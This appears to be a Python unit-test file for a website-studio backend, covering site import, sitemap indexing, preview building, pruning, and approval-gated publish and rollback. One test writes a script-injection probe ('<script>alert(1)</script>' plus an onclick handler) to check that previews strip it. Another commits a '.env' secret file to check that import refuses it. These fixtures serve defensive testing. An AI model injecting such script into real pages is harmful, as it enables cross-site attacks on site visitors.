            (repo_root / "index.html").write_text("<title>Unsafe</title>", encoding="utf-8")
            (repo_root / ".env").write_text("SECRET=value", encoding="utf-8")
            subprocess.run(["git", "init"], cwd=repo_root, check=True, capture_output=True, text=True)
            subprocess.run(["git", "config", "user.email", "agent@example.com"], cwd=repo_root, check=True)
            subprocess.run(["git", "config", "user.name", "Agent"], cwd=repo_root, check=True)
            subprocess.run(["git", "add", "."], cwd=repo_root, check=True)
            subprocess.run(["git", "commit", "-m", "unsafe"], cwd=repo_root, check=True, capture_output=True, text=True)

            status, result = handle_action(
                data_root,
                {"action": "import_git", "site_id": site_id, "repository_url": str(repo_root)},
            )

            self.assertEqual(status, 400)
            self.assertIn("sensitive file", result["detail"])
            self.assertEqual(starter.read_text(encoding="utf-8"), original)

    def test_source_tree_validation_rejects_excessive_file_count(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            source_root = Path(tmp)
            for index in range(MAX_SOURCE_TREE_FILES + 1):
                (source_root / f"page-{index}.html").write_text("<title>Page</title>", encoding="utf-8")

            with self.assertRaisesRegex(ValueError, "too many files"):
                validate_source_tree_for_phase1(source_root)

    def test_publish_with_unverified_approval_stays_blocked(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            data_root = Path(tmp)
            status, created = handle_action(data_root, {"action": "site_create", "display_name": "Acme"})
            self.assertEqual(status, 201)
            site_id = created["site"]["id"]
            _edit_index(data_root, site_id)
            status, request_payload = handle_action(data_root, {"action": "publish_request", "site_id": site_id})
            self.assertEqual(status, 201)

            status, publish_payload = handle_action(
                data_root,
                {
                    "action": "publish",
                    "site_id": site_id,
                    "publish_request_id": request_payload["publish_request"]["id"],
                    "approval_id": "not-a-verified-approval",
                },
            )

            self.assertEqual(status, 403)
            self.assertTrue(publish_payload["blocked"])
            self.assertIn("official approval surface", publish_payload["detail"])

    def test_publish_request_requires_working_diff(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            data_root = Path(tmp)
            status, created = handle_action(data_root, {"action": "site_create", "display_name": "Acme"})
            self.assertEqual(status, 201)

            status, result = handle_action(data_root, {"action": "publish_request", "site_id": created["site"]["id"]})

            self.assertEqual(status, 400)
            self.assertIn("at least one working file change", result["detail"])

    def test_list_changes_reports_diff_revisions_and_publish_requests(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            data_root = Path(tmp)
            status, created = handle_action(data_root, {"action": "site_create", "display_name": "Acme"})
            self.assertEqual(status, 201)
            site_id = created["site"]["id"]
            _edit_index(data_root, site_id)
            status, request_payload = handle_action(data_root, {"action": "publish_request", "site_id": site_id})
            self.assertEqual(status, 201)

            status, changes = handle_action(data_root, {"action": "list_changes", "site_id": site_id})

            self.assertEqual(status, 200)
            self.assertEqual(changes["working_diff"][0]["path"], "index.html")
            self.assertEqual(changes["changesets"][0]["files_changed_count"], 1)
            self.assertEqual(changes["publish_requests"][0]["id"], request_payload["publish_request"]["id"])
            self.assertEqual(changes["revisions"][0]["id"], created["site"]["active_revision_id"])
            self.assertIn("pagination", changes)

    def test_history_lists_are_paginated_and_compact_by_default(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            data_root = Path(tmp)
            status, created = handle_action(data_root, {"action": "site_create", "display_name": "Acme"})
            self.assertEqual(status, 201)
            site_id = created["site"]["id"]
            long_log = "line\n" + ("x" * 3000)
            with closing(sqlite3.connect(data_root / "app.sqlite")) as db, db:
                for index in range(3):
                    db.execute(
                        """
                        INSERT INTO builds(
                          id, site_id, status, runtime_kind, preview_url, artifact_ref_json, source_profile_json,
                          route_count, asset_count, warnings_json, missing_requirements_json, logs_summary, created_at, updated_at
                        )
                        VALUES (?, ?, 'passed', 'static_export', '', '{}', '{}', 1, 0, ?, '[]', ?, ?, ?)
                        """,
                        (
                            f"build_{index}",
                            site_id,
                            json.dumps(["duplicate warning", "duplicate warning"]),
                            long_log,
                            f"2026-06-08T10:00:0{index}+00:00",
                            f"2026-06-08T10:00:0{index}+00:00",
                        ),
                    )

            status, builds = handle_action(data_root, {"action": "builds_list", "site_id": site_id, "limit": 2})

            self.assertEqual(status, 200)
            self.assertEqual(len(builds["items"]), 2)
            self.assertTrue(builds["pagination"]["has_more"])
            self.assertTrue(builds["items"][0]["logs_summary_truncated"])
            self.assertEqual(builds["items"][0]["warnings"], ["duplicate warning"])

            status, full_builds = handle_action(
                data_root,
                {"action": "builds_list", "site_id": site_id, "limit": 1, "include_logs": True},
            )

            self.assertEqual(status, 200)
            self.assertFalse(full_builds["items"][0]["logs_summary_truncated"])
            self.assertIn("xxx", full_builds["items"][0]["logs_summary"])

            status, changes = handle_action(data_root, {"action": "list_changes", "site_id": site_id, "limit": 2})

            self.assertEqual(status, 200)
            self.assertEqual(len(changes["builds"]), 2)
            self.assertTrue(changes["pagination"]["sections"]["builds"]["has_more"])
            self.assertTrue(changes["builds"][0]["logs_summary_truncated"])

    def test_maintenance_prune_removes_old_operational_history_and_build_artifacts(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            data_root = Path(tmp)
            status, created = handle_action(data_root, {"action": "site_create", "display_name": "Acme"})
            self.assertEqual(status, 201)
            site_id = created["site"]["id"]
            with closing(sqlite3.connect(data_root / "app.sqlite")) as db, db:
                for index in range(5):
                    build_id = f"build_{index}"
                    created_at = f"2026-06-08T10:00:0{index}+00:00"
                    artifact_dir = data_root / "sites" / site_id / "builds" / build_id / "runtime"
                    artifact_dir.mkdir(parents=True)
                    (artifact_dir / "index.html").write_text(str(index), encoding="utf-8")
                    db.execute(
                        """
                        INSERT INTO builds(
                          id, site_id, status, runtime_kind, preview_url, artifact_ref_json, source_profile_json,
                          route_count, asset_count, warnings_json, missing_requirements_json, logs_summary, created_at, updated_at
                        )
                        VALUES (?, ?, 'passed', 'php', '', ?, '{}', 1, 0, '[]', '[]', 'ok', ?, ?)
                        """,
                        (
                            build_id,
                            site_id,
                            json.dumps({"runtime_root": f"sites/{site_id}/builds/{build_id}/runtime"}),
                            created_at,
                            created_at,
                        ),
                    )
                    db.execute(
                        """
                        INSERT INTO previews(
                          id, site_id, route, page_id, build_id, runtime_kind, preview_url,
                          warnings_json, missing_requirements_json, artifact_ref_json, status, created_at
                        )
                        VALUES (?, ?, '/', '', ?, 'php', ?, '[]', '[]', '{}', 'ready', ?)
                        """,
                        (f"preview_{index}", site_id, build_id, f"/preview/{index}", created_at),
                    )
                    db.execute(
                        """
                        INSERT INTO runtime_sessions(
                          id, site_id, preview_id, build_id, runtime_kind, status, preview_url,
                          route, health_json, missing_requirements_json, created_at, updated_at
                        )
                        VALUES (?, ?, ?, ?, 'php', 'ready', ?, '/', '{}', '[]', ?, ?)
                        """,
                        (f"runtime_{index}", site_id, f"preview_{index}", build_id, f"/preview/{index}", created_at, created_at),
                    )

            status, dry_run = handle_action(
                data_root,
                {
                    "action": "maintenance_prune",
                    "site_id": site_id,
                    "keep_builds": 2,
                    "keep_previews_per_route": 1,
                    "keep_runtime_sessions": 2,
                    "dry_run": True,
                },
            )

            self.assertEqual(status, 200)
            self.assertTrue(dry_run["dry_run"])
            self.assertEqual(dry_run["totals"]["builds"], 3)
            self.assertTrue((data_root / "sites" / site_id / "builds" / "build_0").exists())

            status, pruned = handle_action(
                data_root,
                {
                    "action": "maintenance_prune",
                    "site_id": site_id,
                    "keep_builds": 2,
                    "keep_previews_per_route": 1,
                    "keep_runtime_sessions": 2,
                },
            )

            self.assertEqual(status, 200)
            self.assertFalse(pruned["dry_run"])
            self.assertEqual(pruned["totals"]["builds"], 3)
            self.assertFalse((data_root / "sites" / site_id / "builds" / "build_0").exists())
            self.assertTrue((data_root / "sites" / site_id / "builds" / "build_4").exists())
            with closing(sqlite3.connect(data_root / "app.sqlite")) as db:
                build_count = db.execute("SELECT COUNT(*) FROM builds WHERE site_id = ?", (site_id,)).fetchone()[0]
                preview_count = db.execute("SELECT COUNT(*) FROM previews WHERE site_id = ?", (site_id,)).fetchone()[0]
                session_count = db.execute("SELECT COUNT(*) FROM runtime_sessions WHERE site_id = ?", (site_id,)).fetchone()[0]
            self.assertEqual(build_count, 2)
            self.assertEqual(preview_count, 1)
            self.assertEqual(session_count, 2)

    def test_rollback_with_unverified_approval_stays_blocked(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            data_root = Path(tmp)
            archive = BytesIO()
            with ZipFile(archive, "w") as zip_file:
                zip_file.writestr("index.html", "<title>Imported</title>")
                zip_file.writestr("assets/logo.png", b"\x89PNG\r\nphase1")
            encoded = base64.b64encode(archive.getvalue()).decode("ascii")

            status, imported = handle_action(
                data_root,
                {"action": "import_zip", "display_name": "Imported", "archive_base64": encoded},
            )
            self.assertEqual(status, 201)
            self.assertNotIn("snapshot", imported["revision"])
            self.assertIn("snapshot_path", imported["revision"])
            site_id = imported["site"]["id"]
            revision_id = imported["revision"]["id"]
            logo = data_root / "sites" / site_id / "source" / "assets" / "logo.png"
            logo.unlink()

            status, rolled_back = handle_action(
                data_root,
                {
                    "action": "rollback",
                    "site_id": site_id,
                    "revision_id": revision_id,
                    "approval_id": "approval_phase1_local",
                    "confirm": True,
                },
            )

            self.assertEqual(status, 403)
            self.assertTrue(rolled_back["blocked"])
            self.assertIn("official approval surface", rolled_back["detail"])
            self.assertFalse(logo.exists())

    def test_rollback_requires_policy_guard(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            data_root = Path(tmp)
            status, created = handle_action(data_root, {"action": "site_create", "display_name": "Acme"})
            self.assertEqual(status, 201)
            site_id = created["site"]["id"]
            revision_id = created["site"]["active_revision_id"]

            status, blocked = handle_action(data_root, {"action": "rollback", "site_id": site_id, "revision_id": revision_id})

            self.assertEqual(status, 403)
            self.assertTrue(blocked["blocked"])
            self.assertIn("approval_id", blocked["detail"])

    def test_zip_import_indexes_routes_assets_and_provenance(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            data_root = Path(tmp)
            archive = BytesIO()
            with ZipFile(archive, "w") as zip_file:
                zip_file.writestr(
                    "index.html",
                    '<title>Imported</title><link rel="stylesheet" href="assets/site.css"><img src="assets/logo.png"><img src="missing.png">',
                )
                zip_file.writestr("about/index.html", "<title>About</title>")
                zip_file.writestr("assets/site.css", "body { color: #111; }")
                zip_file.writestr("assets/logo.png", b"\x89PNG\r\nphase1")
            encoded = base64.b64encode(archive.getvalue()).decode("ascii")
            artifact_ref = {
                "app_id": "storage",
                "file_id": "file_zip",
                "workspace_relative_path": "storage/uploaded/website-studio/imported.zip",
            }

            status, imported = handle_action(
                data_root,
                {
                    "action": "import_zip",
                    "display_name": "Imported",
                    "archive_base64": encoded,
                    "source_artifact_ref": artifact_ref,
                },
            )

            self.assertEqual(status, 201)
            self.assertEqual(imported["import"]["source_shape"], "static_export")
            self.assertEqual(imported["site"]["source_artifact_ref"]["file_id"], "file_zip")

            status, map_payload = handle_action(data_root, {"action": "sitemap", "site_id": imported["site"]["id"]})
            self.assertEqual(status, 200)
            self.assertEqual({item["route"] for item in map_payload["routes"]}, {"/", "/about"})
            self.assertEqual({asset["path"] for asset in map_payload["assets"]}, {"assets/logo.png", "assets/site.css"})
            home = next(item for item in map_payload["items"] if item["route"] == "/")
            self.assertIn("assets/logo.png", home["asset_refs"])
            self.assertIn("missing asset `missing.png`", home["warnings"])

    def test_zip_import_collapses_single_root_directory(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            data_root = Path(tmp)
            archive = BytesIO()
            with ZipFile(archive, "w") as zip_file:
                zip_file.writestr("site-export/index.html", "<title>Nested Export</title>")
                zip_file.writestr("site-export/assets/site.css", "body { color: #111; }")
            encoded = base64.b64encode(archive.getvalue()).decode("ascii")

            status, imported = handle_action(data_root, {"action": "import_zip", "display_name": "Nested", "archive_base64": encoded})
            self.assertEqual(status, 201)
            site_id = imported["site"]["id"]

            self.assertTrue((data_root / "sites" / site_id / "source" / "index.html").exists())
            self.assertFalse((data_root / "sites" / site_id / "source" / "site-export" / "index.html").exists())
            status, map_payload = handle_action(data_root, {"action": "sitemap", "site_id": site_id})
            self.assertEqual(status, 200)
            self.assertEqual(map_payload["items"][0]["route"], "/")

    def test_root_relative_assets_are_indexed_and_inlined_in_preview(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            data_root = Path(tmp)
            archive = BytesIO()
            with ZipFile(archive, "w") as zip_file:
                zip_file.writestr("about/index.html", '<title>About</title><link rel="stylesheet" href="/assets/site.css"><img src="/assets/logo.png">')
                zip_file.writestr("assets/site.css", "body { color: #111; }")
                zip_file.writestr("assets/logo.png", b"\x89PNG\r\nphase1")
            encoded = base64.b64encode(archive.getvalue()).decode("ascii")

            status, imported = handle_action(data_root, {"action": "import_zip", "display_name": "Root Relative", "archive_base64": encoded})
            self.assertEqual(status, 201)
            status, map_payload = handle_action(data_root, {"action": "sitemap", "site_id": imported["site"]["id"]})
            self.assertEqual(status, 200)
            page = map_payload["items"][0]
            self.assertEqual(page["route"], "/about")
            self.assertIn("assets/logo.png", page["asset_refs"])
            self.assertFalse(page["warnings"])

            status, preview = handle_action(data_root, {"action": "build_preview", "site_id": imported["site"]["id"], "route": "/about"})
            self.assertEqual(status, 200)
            self.assertIn("<style>body { color: #111; }</style>", preview["html"])
            self.assertIn("data:image/png;base64,", preview["html"])

    def test_zip_import_reports_source_profile(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            data_root = Path(tmp)
            archive = BytesIO()
            with ZipFile(archive, "w") as zip_file:
                zip_file.writestr("index.html", "<title>Profiled</title>")
                zip_file.writestr("astro.config.mjs", "export default {}")
                zip_file.writestr("package.json", '{"scripts":{"build":"astro build"}}')
                zip_file.writestr("pnpm-lock.yaml", "lockfileVersion: '9.0'")
            encoded = base64.b64encode(archive.getvalue()).decode("ascii")

            status, imported = handle_action(data_root, {"action": "import_zip", "display_name": "Profiled", "archive_base64": encoded})
            self.assertEqual(status, 201)
            self.assertEqual(imported["import"]["source_profile"]["source_shape"], "full_source")
            self.assertEqual(imported["import"]["source_profile"]["framework"], "astro")
            self.assertEqual(imported["import"]["source_profile"]["package_manager"], "pnpm")
            self.assertEqual(imported["site"]["source_shape"], "full_source")

    def test_bootstrap_uses_routes_only_sitemap_and_persisted_source_version(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            data_root = Path(tmp)
            archive = BytesIO()
            with ZipFile(archive, "w") as zip_file:
                zip_file.writestr("index.html", '<title>Bootstrap</title><img src="assets/logo.png">')
                zip_file.writestr("assets/logo.png", b"logo")
            encoded = base64.b64encode(archive.getvalue()).decode("ascii")

            status, imported = handle_action(data_root, {"action": "import_zip", "display_name": "Bootstrap", "archive_base64": encoded})
            self.assertEqual(status, 201)
            site = imported["site"]
            self.assertTrue(str(site.get("source_version") or "").startswith("src_"))

            status, bootstrap_payload = handle_action(data_root, {"action": "bootstrap", "site_id": site["id"], "route": "/"})
            self.assertEqual(status, 200)
            self.assertEqual(bootstrap_payload["active_site_id"], site["id"])
            self.assertEqual(bootstrap_payload["sitemap"]["items"][0]["route"], "/")
            self.assertEqual(bootstrap_payload["sitemap"]["assets"], [])

            status, routes_only = handle_action(data_root, {"action": "sitemap", "site_id": site["id"], "mode": "routes-only"})
            self.assertEqual(status, 200)
            self.assertEqual(routes_only["assets"], [])
            status, full_map = handle_action(data_root, {"action": "sitemap", "site_id": site["id"]})
            self.assertEqual(status, 200)
            self.assertEqual([asset["path"] for asset in full_map["assets"]], ["assets/logo.png"])

    def test_workspace_snapshot_is_compact_versioned_and_supports_not_modified(self) -> None:
        with tempfile.TemporaryDirectory() as temp_dir:
            data_root = Path(temp_dir)
            _, created = handle_action(data_root, {"action": "site_create", "display_name": "Snapshot"})
            site_id = created["site"]["id"]

            status, snapshot = handle_action(data_root, {"action": "workspace_snapshot", "site_id": site_id})
            self.assertEqual(status, 200)
            self.assertEqual(snapshot["schema"], "workspace_snapshot.v1")
            self.assertEqual(snapshot["workspace"]["active_project_id"], site_id)
            self.assertIn("navigation", snapshot["project"])
            self.assertIn("working_state", snapshot["project"])
            self.assertNotIn("working_diff", snapshot["project"])
            self.assertNotIn("assets", snapshot["project"]["navigation"])

            status, unchanged = handle_action(data_root, {
                "action": "workspace_snapshot",
                "site_id": site_id,
                "known_versions": snapshot["versions"],
            })
            self.assertEqual(status, 200)
            self.assertTrue(unchanged["not_modified"])
            self.assertNotIn("project", unchanged)

    def test_bootstrap_does_not_return_preview_after_source_version_changes(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            data_root = Path(tmp)
            archive = BytesIO()
            with ZipFile(archive, "w") as zip_file:
                zip_file.writestr("index.html", "<title>Bootstrap</title><main>v1</main>")
            encoded = base64.b64encode(archive.getvalue()).decode("ascii")

            status, imported = handle_action(data_root, {"action": "import_zip", "display_name": "Bootstrap", "archive_base64": encoded})
            self.assertEqual(status, 201)
            site_id = imported["site"]["id"]
            status, preview = handle_action(data_root, {"action": "build_preview", "site_id": site_id, "route": "/", "include_html": False})
            self.assertEqual(status, 200)
            status, bootstrap_payload = handle_action(data_root, {"action": "bootstrap", "site_id": site_id, "route": "/"})
            self.assertEqual(status, 200)
            self.assertEqual(bootstrap_payload["latest_preview"]["id"], preview["preview_id"])

            status, read_payload = handle_action(data_root, {"action": "read_file", "site_id": site_id, "path": "index.html"})
            self.assertEqual(status, 200)
            status, write_payload = handle_action(
                data_root,
                {
                    "action": "write_file",
                    "site_id": site_id,
                    "path": "index.html",
                    "content": read_payload["file"]["content"].replace("v1", "v2"),
                    "expected_hash": read_payload["file"]["hash"],
                },
            )
            self.assertEqual(status, 200)
            status, refreshed_bootstrap = handle_action(data_root, {"action": "bootstrap", "site_id": site_id, "route": "/"})
            self.assertEqual(status, 200)
            self.assertIsNone(refreshed_bootstrap["latest_preview"])

    def test_sitemap_index_includes_xml_redirects_and_seo_metadata(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            data_root = Path(tmp)
            archive = BytesIO()
            with ZipFile(archive, "w") as zip_file:
                zip_file.writestr(
                    "index.html",
                    (
                        "<title>Imported</title>"
                        '<meta name="description" content="Primary page">'
                        '<meta property="og:title" content="OG imported">'
                        '<link rel="canonical" href="https://example.com/">'
                    ),
                )
                zip_file.writestr(
                    "sitemap.xml",
                    """<?xml version="1.0" encoding="UTF-8"?>
<urlset xmlns="http://www.sitemaps.org/schemas/sitemap/0.9">
  <url><loc>https://example.com/missing</loc></url>
</urlset>
""",
                )
                zip_file.writestr("_redirects", "/old /new 302\n")
            encoded = base64.b64encode(archive.getvalue()).decode("ascii")

            status, imported = handle_action(data_root, {"action": "import_zip", "display_name": "Indexed", "archive_base64": encoded})
            self.assertEqual(status, 201)
            status, map_payload = handle_action(data_root, {"action": "sitemap", "site_id": imported["site"]["id"]})

            self.assertEqual(status, 200)
            routes = {item["route"]: item for item in map_payload["routes"]}
            self.assertEqual(map_payload["items"][0]["seo"]["description"], "Primary page")
            self.assertEqual(map_payload["items"][0]["seo"]["og_title"], "OG imported")
            self.assertEqual(map_payload["items"][0]["seo"]["canonical"], "https://example.com/")
            self.assertEqual(routes["/missing"]["kind"], "sitemap")
            self.assertEqual(routes["/missing"]["status"], "unmatched")
            self.assertEqual(routes["/old"]["kind"], "redirect")
            self.assertIn("redirects to /new (302)", routes["/old"]["warnings"])

    def test_phase1_acceptance_workflow_covers_multisite_zip_git_edit_preview_references_and_context(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            data_root = Path(tmp)
            status, manual = handle_action(data_root, {"action": "site_create", "display_name": "Manual Site"})
            self.assertEqual(status, 201)

            archive = BytesIO()
            with ZipFile(archive, "w") as zip_file:
                zip_file.writestr("index.html", '<title>Zip Home</title><link rel="stylesheet" href="assets/site.css"><img src="assets/logo.png">')
                zip_file.writestr("pages/contact.html", "<title>Contact</title>")
                zip_file.writestr("assets/site.css", "body { color: #123; }")
                zip_file.writestr("assets/logo.png", b"\x89PNG\r\nacceptance")
            encoded = base64.b64encode(archive.getvalue()).decode("ascii")
            status, zip_import = handle_action(
                data_root,
                {
                    "action": "import_zip",
                    "display_name": "Zip Site",
                    "archive_base64": encoded,
                    "source_artifact_ref": {
                        "app_id": "storage",
                        "file_id": "file_acceptance_zip",
                        "workspace_relative_path": "storage/uploaded/website-studio/acceptance.zip",
                    },
                },
            )
            self.assertEqual(status, 201)
            zip_site_id = zip_import["site"]["id"]

            repo_root = data_root / "fixtures" / "repo"
            repo_root.mkdir(parents=True)
            (repo_root / "index.html").write_text("<title>Git Home</title><main>Imported</main>", encoding="utf-8")
            (repo_root / "about.html").write_text("<title>Git About</title>", encoding="utf-8")
            subprocess.run(["git", "init"], cwd=repo_root, check=True, capture_output=True, text=True)
            subprocess.run(["git", "config", "user.email", "agent@example.com"], cwd=repo_root, check=True)
            subprocess.run(["git", "config", "user.name", "Agent"], cwd=repo_root, check=True)
            subprocess.run(["git", "add", "."], cwd=repo_root, check=True)
            subprocess.run(["git", "commit", "-m", "initial"], cwd=repo_root, check=True, capture_output=True, text=True)
            status, git_import = handle_action(data_root, {"action": "import_git", "repository_url": str(repo_root), "display_name": "Git Site"})
            self.assertEqual(status, 201)
            self.assertEqual(git_import["site"]["source_provider"], "git")

            status, sites = handle_action(data_root, {"action": "sites_list"})
            self.assertEqual(status, 200)
            self.assertEqual({item["id"] for item in sites["items"]}, {manual["site"]["id"], zip_site_id, git_import["site"]["id"]})

            status, active = handle_action(data_root, {"action": "site_set_active", "site_id": zip_site_id})
            self.assertEqual(status, 200)
            self.assertEqual(active["state"]["active_site_id"], zip_site_id)
            status, map_payload = handle_action(data_root, {"action": "sitemap", "site_id": zip_site_id})
            self.assertEqual(status, 200)
            self.assertEqual({item["route"] for item in map_payload["items"]}, {"/", "/pages/contact"})
            self.assertTrue(map_payload["assets"])

            status, read_payload = handle_action(data_root, {"action": "read_file", "site_id": zip_site_id, "path": "index.html"})
            self.assertEqual(status, 200)
            stale_hash = read_payload["file"]["hash"]
            status, write_payload = handle_action(
                data_root,
                {
                    "action": "write_file",
                    "site_id": zip_site_id,
                    "path": "index.html",
                    "content": read_payload["file"]["content"].replace("</title>", " Updated</title>", 1),
                    "expected_hash": stale_hash,
                },
            )
            self.assertEqual(status, 200)
            status, stale = handle_action(
                data_root,
                {
                    "action": "write_file",
                    "site_id": zip_site_id,
                    "path": "index.html",
                    "content": read_payload["file"]["content"],
                    "expected_hash": stale_hash,
                },
            )
            self.assertEqual(status, 400)
            self.assertIn("stale write rejected", stale["detail"])

            status, diff_payload = handle_action(data_root, {"action": "diff", "site_id": zip_site_id})
            self.assertEqual(status, 200)
            self.assertEqual(diff_payload["files"][0]["path"], "index.html")
            status, preview = handle_action(data_root, {"action": "build_preview", "site_id": zip_site_id, "route": "/"})
            self.assertEqual(status, 200)
            self.assertIn("Content-Security-Policy", preview["html"])
            self.assertEqual(preview["runtime_kind"], "static_export")
            self.assertEqual(preview["runtime_status"], "ready")
            self.assertTrue(preview["preview_url"].startswith("/apps/website-studio/preview-runtime/?"))
            self.assertEqual(preview["missing_requirements"], [])

            page_id = map_payload["items"][0]["id"]
            route_id = map_payload["routes"][0]["id"]
            asset_id = map_payload["assets"][0]["id"]
            status, page_ref = handle_action(data_root, {"action": "reference_resolve", "entity_type": "page", "id": page_id})
            self.assertEqual(status, 200)
            self.assertTrue(page_ref["item"]["deep_link"].startswith("/app/website-studio/pages/"))
            status, route_context = handle_action(data_root, {"action": "page_context", "site_id": zip_site_id, "route_id": route_id})
            self.assertEqual(status, 200)
            self.assertEqual(route_context["route_id"], route_id)
            status, asset_context = handle_action(data_root, {"action": "page_context", "site_id": zip_site_id, "asset_id": asset_id})
            self.assertEqual(status, 200)
            self.assertEqual(asset_context["asset_id"], asset_id)

    def test_preview_html_is_sandbox_prepared(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            data_root = Path(tmp)
            status, created = handle_action(data_root, {"action": "site_create", "display_name": "Acme"})
            self.assertEqual(status, 201)
            site_id = created["site"]["id"]
            status, read_payload = handle_action(data_root, {"action": "read_file", "site_id": site_id, "path": "index.html"})
            self.assertEqual(status, 200)
            status, _ = handle_action(
                data_root,
                {
                    "action": "write_file",
                    "site_id": site_id,
                    "path": "index.html",
                    "content": "<!doctype html><title>X</title><button onclick=\"alert(1)\">x</button><script>alert(1)</script>",
                    "expected_hash": read_payload["file"]["hash"],
                },
            )
            self.assertEqual(status, 200)

            status, preview = handle_action(data_root, {"action": "build_preview", "site_id": site_id})

            self.assertEqual(status, 200)
            self.assertEqual(preview["runtime_kind"], "static_export")
            self.assertEqual(preview["runtime_status"], "ready")
            self.assertTrue(preview["preview_url"].startswith("/apps/website-studio/preview-runtime/?"))
            self.assertIn(f"preview_id={preview['preview_id']}", preview["preview_url"])
            self.assertIn("Content-Security-Policy", preview["html"])
            self.assertNotIn("<script", preview["html"].lower())
            self.assertNotIn("onclick", preview["html"].lower())

    def test_preview_inlines_static_css_and_image_assets(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            data_root = Path(tmp)
            archive = BytesIO()
            with ZipFile(archive, "w") as zip_file:
                zip_file.writestr("index.html", '<title>Preview</title><link rel="stylesheet" href="assets/site.css"><img src="assets/logo.png">')
                zip_file.writestr("assets/site.css", "body { color: #111; }")
                zip_file.writestr("assets/logo.png", b"\x89PNG\r\nphase1")
            encoded = base64.b64encode(archive.getvalue()).decode("ascii")

            status, imported = handle_action(data_root, {"action": "import_zip", "display_name": "Preview", "archive_base64": encoded})
            self.assertEqual(status, 201)
            status, preview = handle_action(data_root, {"action": "build_preview", "site_id": imported["site"]["id"]})

            self.assertEqual(status, 200)
            self.assertIn("<style>body { color: #111; }</style>", preview["html"])
            self.assertIn("data:image/png;base64,", preview["html"])

    def test_runtime_preview_document_rewrites_local_assets_for_static_sites(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            data_root = Path(tmp)
            archive = BytesIO()
            with ZipFile(archive, "w") as zip_file:
                zip_file.writestr(
                    "index.html",
                    (
                        "<!doctype html><html><head>"
                        '<link rel="stylesheet" href="assets/site.css">'
                        '<style>.hero{background:url("assets/hero.webp")}</style>'
                        "<style>@font-face{font-family:Trail;src:url('fonts/Trail.woff2')}</style>"
                        '</head><body><a href="/index.php#trails">Trails</a><main>Runtime</main>'
                        '<img data-src="assets/photo.webp" src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7">'
                        '<img src="images/cortina.webp">'
                        '<script src="assets/site.js"></script>'
                        "<script>const lateScript = document.createElement('script'); lateScript.src = 'assets/late.js'; document.body.appendChild(lateScript);</script>"
                        "</body></html>"
                    ),
                )
                zip_file.writestr(
                    "legal/terms.html",
                    (
                        "<!doctype html><html><head>"
                        '<link rel="stylesheet" href="../assets/site.css">'
                        "</head><body>"
                        '<img data-src="../assets/photo.webp">'
                        "</body></html>"
                    ),
                )
                zip_file.writestr("assets/site.css", "main { color: #123; background: url('/assets/bg.webp'); }")
                zip_file.writestr("assets/site.js", "window.__websiteStudioRuntimeTest = true;")
                zip_file.writestr("assets/late.js", "window.__websiteStudioLateScript = true;")
                zip_file.writestr("assets/photo.webp", b"photo")
                zip_file.writestr("assets/hero.webp", b"hero")
                zip_file.writestr("assets/bg.webp", b"bg")
                zip_file.writestr("assets/images/cortina.webp", b"cortina")
                zip_file.writestr("assets/fonts/Trail.woff2", b"font")
            encoded = base64.b64encode(archive.getvalue()).decode("ascii")

            status, imported = handle_action(data_root, {"action": "import_zip", "display_name": "Runtime Static", "archive_base64": encoded})
            self.assertEqual(status, 201)
            status, preview = handle_action(data_root, {"action": "build_preview", "site_id": imported["site"]["id"]})
            self.assertEqual(status, 200)
            self.assertEqual(preview["runtime_kind"], "static_export")
            self.assertEqual(preview["runtime_status"], "ready")
            self.assertTrue(preview["preview_url"].startswith("/apps/website-studio/preview-runtime/?"))
            self.assertNotIn("<script", preview["html"].lower())

            status, document = handle_action(data_root, {"action": "preview_document", "preview_id": preview["preview_id"]})
            self.assertEqual(status, 200)
            self.assertEqual(document["preview"]["id"], preview["preview_id"])
            self.assertEqual(document["preview"]["status"], "ready")
            self.assertIn('<meta charset="utf-8">', document["html"])
            self.assertIn("/api/apps/website-studio/backend/file/gw_", document["html"])
            self.assertNotIn("/api/apps/website-studio/backend/media?", document["html"])
            self.assertIn('data-website-studio-inline-stylesheet="assets/site.css"', document["html"])
            self.assertIn("main { color: #123", document["html"])
            self.assertIn('data-website-studio-inline-script="assets/site.js"', document["html"])
            self.assertIn("data-website-studio-inline-script-runner", document["html"])
            self.assertIn("data-website-studio-preview-shim", document["html"])
            self.assertIn("data-website-studio-preview-lazy-assets", document["html"])
            self.assertIn("assets/photo.webp", document["source_map"]["asset_refs"])
            self.assertIn("assets/hero.webp", document["source_map"]["asset_refs"])
            self.assertIn("assets/bg.webp", document["source_map"]["asset_refs"])
            self.assertIn("images/cortina.webp", document["source_map"]["asset_refs"])
            self.assertIn("fonts/Trail.woff2", document["source_map"]["asset_refs"])
            self.assertIn("script-src &#39;unsafe-inline&#39; blob: __WEBSITE_STUDIO_PREVIEW_MEDIA_SOURCE__ __WEBSITE_STUDIO_PREVIEW_FILE_GATEWAY_SOURCE__", document["html"])
            self.assertIn("font-src data: blob: https: __WEBSITE_STUDIO_PREVIEW_MEDIA_SOURCE__ __WEBSITE_STUDIO_PREVIEW_FILE_GATEWAY_SOURCE__", document["html"])
            self.assertIn("style-src &#39;unsafe-inline&#39; blob: https: __WEBSITE_STUDIO_PREVIEW_MEDIA_SOURCE__ __WEBSITE_STUDIO_PREVIEW_FILE_GATEWAY_SOURCE__", document["html"])
            self.assertNotIn('src="assets/site.js"', document["html"])
            self.assertNotIn('<script src="__WEBSITE_STUDIO_PREVIEW_ORIGIN__/api/apps/website-studio/backend/media?preview_id=', document["html"])
